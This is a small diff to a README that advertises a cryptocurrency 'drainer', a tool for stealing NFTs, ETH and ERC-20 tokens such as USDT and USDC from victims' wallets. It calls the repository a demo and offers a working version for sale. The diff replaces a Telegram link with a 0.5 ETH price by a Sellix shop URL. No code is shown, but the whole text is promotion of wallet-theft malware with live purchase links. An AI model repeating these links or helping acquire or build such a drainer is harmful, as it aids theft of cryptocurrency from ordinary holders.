@@ -1,5 +1,5 @@
 # ⛔ THIS DRAINER IS ONLY A DEMO, TO GET A WORKING ONE 
-BUY ON TELEGRAM 0.5 ETH [LINK HERE](https://t.me/samirdatonETH)
+- Shop: https://samireth.mysellix.io/
 
 # 🆓  DRAINER (NFT, ETH, ERC-20 USDT USDC ETC... ⬆️⬆️⬆️
 
